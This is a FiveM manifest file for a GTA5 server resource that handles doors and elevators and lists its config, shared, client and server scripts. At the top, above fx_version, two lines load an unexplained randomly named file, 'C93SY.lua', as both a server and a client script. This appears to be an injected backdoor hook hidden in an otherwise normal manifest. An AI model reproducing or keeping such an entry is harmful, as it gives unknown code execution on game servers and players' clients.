server_script "C93SY.lua"
client_script "C93SY.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"config.lua",
	"utils.lua",
	"shared/elevatorConfig.lua",
	"shared/doorConfig/**/*.lua",
	"client/*.lua",
})

server_scripts({
	"config.lua",
	"utils.lua",
	"shared/elevatorConfig.lua",
	"shared/doorConfig/**/*.lua",
	"server/*.lua",
})
